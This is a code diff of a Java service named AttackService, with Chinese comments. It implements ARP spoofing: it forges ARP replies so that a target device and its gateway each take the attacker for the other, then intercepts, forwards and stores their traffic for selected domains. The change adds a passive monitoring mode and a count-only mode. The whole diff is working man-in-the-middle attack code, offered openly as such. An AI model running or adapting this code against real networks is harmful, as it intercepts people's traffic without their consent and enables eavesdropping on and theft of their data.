@@ -96,6 +96,9 @@ public class AttackService {
     @Autowired
     private NsLookupService nsLookupService;
 
+    private Boolean monitorMode = false;
+    private Boolean countingNoSaving = false;
+
     @PostConstruct
     public void initDefaultConfig() throws IOException {
         this.initDevicelist();
@@ -215,7 +218,7 @@ public class AttackService {
      * @param changeMAC 要转发出去的目标
      */
 
-    private void send(Packet packet, byte[] changeMAC) {
+    private void sendPacketToMac(Packet packet, byte[] changeMAC) {
         EthernetPacket eth;
         if (packet.datalink instanceof EthernetPacket) {
             eth = (EthernetPacket) packet.datalink;
@@ -250,57 +253,60 @@ public class AttackService {
         //update all real ips of domains
         nsLookupService.nsLookup(this.filterDomain);
 
-        // 设置ARP包欺骗目标主机，假装自己是网关
-        ARPPacket arp_to_dest = new ARPPacket();
-        arp_to_dest.hardtype = ARPPacket.HARDTYPE_ETHER;    //硬件类型
-        arp_to_dest.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
-        arp_to_dest.operation = ARPPacket.ARP_REPLY;      //操作类型 REPLY 表示类型为应答
-        arp_to_dest.hlen = 6;  //硬件地址长度
-        arp_to_dest.plen = 4;  //协议类型长度
-        arp_to_dest.sender_hardaddr = srcMacBt;  //发送端MAC地址
-        arp_to_dest.sender_protoaddr = gateIpIA.getAddress(); //发送端IP地址
-        arp_to_dest.target_hardaddr = destMacBt;  //目标硬件地址
-        arp_to_dest.target_protoaddr = destIpIA.getAddress(); //目标IP地址
-        // 定义以太网首部
-        EthernetPacket eth_to_dest = new EthernetPacket();
-        eth_to_dest.frametype = EthernetPacket.ETHERTYPE_ARP;  //设置帧的类型为ARP帧
-        eth_to_dest.src_mac = srcMacBt;  //源MAC地址
-        eth_to_dest.dst_mac = destMacBt;  //目标MAC地址
-        arp_to_dest.datalink = eth_to_dest;  //添加
+        //若为监听模式，则不点对点攻击，只监听往来数据包，此时并不能保证嗅探到所有数据包
+        if (!monitorMode) {
+            // 设置ARP包欺骗目标主机，假装自己是网关
+            ARPPacket arp_to_dest = new ARPPacket();
+            arp_to_dest.hardtype = ARPPacket.HARDTYPE_ETHER;    //硬件类型
+            arp_to_dest.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
+            arp_to_dest.operation = ARPPacket.ARP_REPLY;      //操作类型 REPLY 表示类型为应答
+            arp_to_dest.hlen = 6;  //硬件地址长度
+            arp_to_dest.plen = 4;  //协议类型长度
+            arp_to_dest.sender_hardaddr = srcMacBt;  //发送端MAC地址
+            arp_to_dest.sender_protoaddr = gateIpIA.getAddress(); //发送端IP地址
+            arp_to_dest.target_hardaddr = destMacBt;  //目标硬件地址
+            arp_to_dest.target_protoaddr = destIpIA.getAddress(); //目标IP地址
+            // 定义以太网首部
+            EthernetPacket eth_to_dest = new EthernetPacket();
+            eth_to_dest.frametype = EthernetPacket.ETHERTYPE_ARP;  //设置帧的类型为ARP帧
+            eth_to_dest.src_mac = srcMacBt;  //源MAC地址
+            eth_to_dest.dst_mac = destMacBt;  //目标MAC地址
+            arp_to_dest.datalink = eth_to_dest;  //添加
 
-        // 设置ARP包欺骗网关，假装自己是目标主机
-        ARPPacket arp_to_gate = new ARPPacket();
-        arp_to_gate.hardtype = ARPPacket.HARDTYPE_ETHER;    //硬件类型
-        arp_to_gate.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
-        arp_to_gate.operation = ARPPacket.ARP_REPLY;      //操作类型 REPLY 表示类型为应答
-        arp_to_gate.hlen = 6;  //硬件地址长度
-        arp_to_gate.plen = 4;  //协议类型长度
-        arp_to_gate.sender_hardaddr = srcMacBt;  //发送端MAC地址
-        arp_to_gate.sender_protoaddr = destIpIA.getAddress(); //发送端IP地址
-        arp_to_gate.target_hardaddr = gateMacBt;  //目标硬件地址
-        arp_to_gate.target_protoaddr = gateIpIA.getAddress(); //目标IP地址
-        // 定义以太网首部
-        EthernetPacket eth_to_gate = new EthernetPacket();
-        eth_to_gate.frametype = EthernetPacket.ETHERTYPE_ARP;  //设置帧的类型为ARP帧
-        eth_to_gate.src_mac = srcMacBt;  //源MAC地址
-        eth_to_gate.dst_mac = gateMacBt;  //目标MAC地址
-        arp_to_gate.datalink = eth_to_gate;  //添加
+            // 设置ARP包欺骗网关，假装自己是目标主机
+            ARPPacket arp_to_gate = new ARPPacket();
+            arp_to_gate.hardtype = ARPPacket.HARDTYPE_ETHER;    //硬件类型
+            arp_to_gate.prototype = ARPPacket.PROTOTYPE_IP;   //协议类型
+            arp_to_gate.operation = ARPPacket.ARP_REPLY;      //操作类型 REPLY 表示类型为应答
+            arp_to_gate.hlen = 6;  //硬件地址长度
+            arp_to_gate.plen = 4;  //协议类型长度
+            arp_to_gate.sender_hardaddr = srcMacBt;  //发送端MAC地址
+            arp_to_gate.sender_protoaddr = destIpIA.getAddress(); //发送端IP地址
+            arp_to_gate.target_hardaddr = gateMacBt;  //目标硬件地址
+            arp_to_gate.target_protoaddr = gateIpIA.getAddress(); //目标IP地址
+            // 定义以太网首部
+            EthernetPacket eth_to_gate = new EthernetPacket();
+            eth_to_gate.frametype = EthernetPacket.ETHERTYPE_ARP;  //设置帧的类型为ARP帧
+            eth_to_gate.src_mac = srcMacBt;  //源MAC地址
+            eth_to_gate.dst_mac = gateMacBt;  //目标MAC地址
+            arp_to_gate.datalink = eth_to_gate;  //添加
 
-        //创建一个进程控制发包速度
-        Thread arpThread = new Thread(() -> {
-            while (attacking) {
-                try {
-                    if (sender != null && attacking)
-                        sender.sendPacket(arp_to_dest);
-                    if (sender != null && attacking)
-                        sender.sendPacket(arp_to_gate);
-                    Thread.sleep(500);
-                } catch (Throwable e) {
-                    logger.error("Unknown error in send thread, ", e);
+            //创建一个进程控制发包速度
+            Thread arpThread = new Thread(() -> {
+                while (attacking) {
+                    try {
+                        if (sender != null && attacking)
+                            sender.sendPacket(arp_to_dest);
+                        if (sender != null && attacking)
+                            sender.sendPacket(arp_to_gate);
+                        Thread.sleep(500);
+                    } catch (Throwable e) {
+                        logger.error("Unknown error in send thread, ", e);
+                    }
                 }
-            }
-        });
-        arpThread.start();
+            });
+            arpThread.start();
+        }
 
         Thread revThread = new Thread(() -> {
             //接收数据包并转发
@@ -311,40 +317,76 @@ public class AttackService {
                         //IP: TCP/UDP/ICMP
                         if (packet instanceof IPPacket) {
                             IPPacket ipPacket = (IPPacket) packet;
-                            if (this.isIpRelatedWithSpecificDomains(ipPacket.src_ip.getHostAddress()) || this.isIpRelatedWithSpecificDomains(ipPacket.dst_ip.getHostAddress())) {
+                            String packetSrcIp = ipPacket.src_ip.getHostAddress();
+                            String packetDstIp = ipPacket.dst_ip.getHostAddress();
+                            boolean sendFromTargetDevice = packetSrcIp.equals(destIp);
+                            boolean sendToTargetDevice = packetDstIp.equals(destIp);
+                            boolean sendFromSpecifiedDomains = this.isIpRelatedWithSpecificDomains(packetSrcIp);
+                            boolean sendToSpecifiedDomains = this.isIpRelatedWithSpecificDomains(packetDstIp);
+
+                            //收集与嗅探域名相关的数据包，区分上下行入库
+                            //logger.info("Captured IP packet from " + ipPacket.src_ip.getHostAddress() + " to " + ipPacket.dst_ip.getHostAddress());
+                            if (sendFromSpecifiedDomains || sendToSpecifiedDomains) {
                                 //redirect packets to target or gateway and save them
                                 //upstream
-                                if (ipPacket.src_ip.getHostAddress().equals(destIp)) {
+                                if (sendToSpecifiedDomains) {
                                     //If the source mac is local mac, that means this packet is sending by myself to attack, so ignore it
                                     if (packet.datalink instanceof EthernetPacket) {
                                         EthernetPacket eth = (EthernetPacket) packet.datalink;
                                         String sendFromMac = eth.getSourceAddress();
                                         if (!sendFromMac.equalsIgnoreCase(this.srcMac)) {
-                                            this.saveCapaturedPacket(ipPacket, true);
-                                            //logger.info("IP--- Src: " + ipPacket.src_ip.getHostAddress() + ", Dest: " + ipPacket.dst_ip.getHostAddress());
+                                            if (countingNoSaving)
+                                                this.calculateUpDownStreams(ipPacket, true);
+                                            else
+                                                this.saveCapaturedPacket(ipPacket, true);
                                         }
                                     }
-
-                                    send(ipPacket, gateMacBt);
                                 }
                                 //downstream
-                                else if (ipPacket.dst_ip.getHostAddress().equals(destIp)) {
-                                    //logger.info("IP--- Src: " + ipPacket.src_ip.getHostAddress() + ", Dest: " + ipPacket.dst_ip.getHostAddress());
-
+                                else if (sendFromSpecifiedDomains) {
                                     //For downstream packets, the important thing is to filter the packets sent by myself for attacking
-                                    this.saveCapaturedPacket(ipPacket, false);
-
-                                    send(ipPacket, destMacBt);
+                                    if (packet.datalink instanceof EthernetPacket) {
+                                        EthernetPacket eth = (EthernetPacket) packet.datalink;
+                                        String sendFromMac = eth.getSourceAddress();
+                                        if (!sendFromMac.equalsIgnoreCase(this.srcMac)) {
+                                            if (countingNoSaving)
+                                                this.calculateUpDownStreams(ipPacket, true);
+                                            else
+                                                this.saveCapaturedPacket(ipPacket, false);
+                                        }
+                                    }
                                 }
                             } else {
-                                logger.info("Ignore IP packet from " + ipPacket.src_ip.getHostAddress() + " to " + ipPacket.dst_ip.getHostAddress());
+                                //logger.info("Ignore IP packet from " + ipPacket.src_ip.getHostAddress() + " to " + ipPacket.dst_ip.getHostAddress());
                             }
+
+                            //转发IP数据包，转为发往网关或攻击目标
+                            if (!monitorMode) {
+                                //redirect the packet to gateway because this packet is from target device
+                                if (sendFromTargetDevice) {
+                                    sendPacketToMac(ipPacket, gateMacBt);
+                                }
+                                //redirect the packet to target device because this packet is from the gateway
+                                else if (sendToTargetDevice) {
+                                    sendPacketToMac(ipPacket, destMacBt);
+                                } else {
+                                    //sendPacketToMac(ipPacket, destMacBt);
+                                    //logger.info("Ignore IP--- Src: " + packetSrcIp + " | " + srcMac + ", Dest: " + packetDstIp + " | " + dstMac);
+                                }
+                            }
+
                         }
                         if (packet instanceof ARPPacket) {
                             ARPPacket arpPacket = (ARPPacket) packet;
-                            if (this.isIpRelatedWithSpecificDomains(NetworkUtils.bytesToIp(arpPacket.sender_protoaddr)) || this.isIpRelatedWithSpecificDomains(NetworkUtils.bytesToIp(arpPacket.target_protoaddr))) {
+                            boolean sendFromTargetDevice = arpPacket.sender_protoaddr.equals(destIpIA.getAddress());
+                            boolean sendToTargetDevice = arpPacket.target_protoaddr.equals(destIpIA.getAddress());
+                            boolean sendFromSpecifiedDomains = this.isIpRelatedWithSpecificDomains(NetworkUtils.bytesToIp(arpPacket.sender_protoaddr));
+                            boolean sendToSpecifiedDomains = this.isIpRelatedWithSpecificDomains(NetworkUtils.bytesToIp(arpPacket.target_protoaddr));
+
+                            //收集与嗅探域名相关的数据包，区分上下行入库
+                            if (sendFromSpecifiedDomains || sendToSpecifiedDomains) {
                                 //upstream
-                                if (arpPacket.sender_protoaddr.equals(destIpIA.getAddress())) {
+                                if (sendFromTargetDevice) {
                                     //If the source mac is local mac, that means this packet is sending by myself to attack, so ignore it
                                     if (packet.datalink instanceof EthernetPacket) {
                                         EthernetPacket eth = (EthernetPacket) packet.datalink;
@@ -352,19 +394,18 @@ public class AttackService {
                                         if (!sendFromMac.equalsIgnoreCase(this.srcMac)) {
                                             //logger.info("ARP--- Src: " + NetworkUtils.bytesToIp(arpPacket.sender_protoaddr) + ", Dest: " + NetworkUtils.bytesToIp(arpPacket.target_protoaddr));
                                             this.saveCapaturedPacket(arpPacket, true);
+                                            //this.calculateUpDownStreams(arpPacket, true);
                                         }
                                     }
-                                    send(arpPacket, gateMacBt);
                                 }
                                 //downstream
-                                else if (arpPacket.target_protoaddr.equals(destIpIA.getAddress())) {
+                                else if (sendToTargetDevice) {
                                     //logger.info("ARP--- Src: " + NetworkUtils.bytesToIp(arpPacket.sender_protoaddr) + ", Dest: " + NetworkUtils.bytesToIp(arpPacket.target_protoaddr));
                                     this.saveCapaturedPacket(arpPacket, false);
-                                    send(arpPacket, destMacBt);
+                                    //this.calculateUpDownStreams(arpPacket, false);
                                 }
                             }
                         }
-
                     }
                 } catch (Throwable e) {
                     logger.error("Unknown error in receive thread, ", e);
@@ -383,11 +424,37 @@ public class AttackService {
         return false;
     }
 
-    private void saveCapaturedPacket(Packet packet, boolean upstream) {
+    private void calculateUpDownStreams(Packet packet, Boolean upstream) {
         if (upstream)
             this.upStreamNum++;
         else
             this.downStreamNum++;
+
+        if (packet instanceof TCPPacket) {
+            if (upstream)
+                this.upTcpNum++;
+            else
+                this.downTcpNum++;
+        } else if (packet instanceof UDPPacket) {
+            if (upstream)
+                this.upUdpNum++;
+            else
+                this.downUdpNum++;
+        } else if (packet instanceof ICMPPacket) {
+            if (upstream)
+                this.upIcmpNum++;
+            else
+                this.downIcmpNum++;
+        } else if (packet instanceof ARPPacket) {
+            if (upstream)
+                this.upArpNum++;
+            else
+                this.downArpNum++;
+        }
+    }
+
+    private void saveCapaturedPacket(Packet packet, Boolean upstream) {
+        this.calculateUpDownStreams(packet, upstream);
 
         CapturedPacket capturedPacket = new CapturedPacket();
         capturedPacket.setUpstream(upstream);
@@ -395,28 +462,12 @@ public class AttackService {
         capturedPacket.setStartAttackTime(this.startAttackTime);
         if (packet instanceof TCPPacket) {
             capturedPacket.setPacket(TCPPacketModel.readFrom((TCPPacket) packet));
-            if (upstream)
-                this.upTcpNum++;
-            else
-                this.downTcpNum++;
         } else if (packet instanceof UDPPacket) {
             capturedPacket.setPacket(UDPPacketModel.readFrom((UDPPacket) packet));
-            if (upstream)
-                this.upUdpNum++;
-            else
-                this.downUdpNum++;
         } else if (packet instanceof ICMPPacket) {
             capturedPacket.setPacket(ICMPPacketModel.readFrom((ICMPPacket) packet));
-            if (upstream)
-                this.upIcmpNum++;
-            else
-                this.downIcmpNum++;
         } else if (packet instanceof ARPPacket) {
             capturedPacket.setPacket(ARPPacketModel.readFrom((ARPPacket) packet));
-            if (upstream)
-                this.upArpNum++;
-            else
-                this.downArpNum++;
         }
         genericDao.insert(capturedPacket);
     }
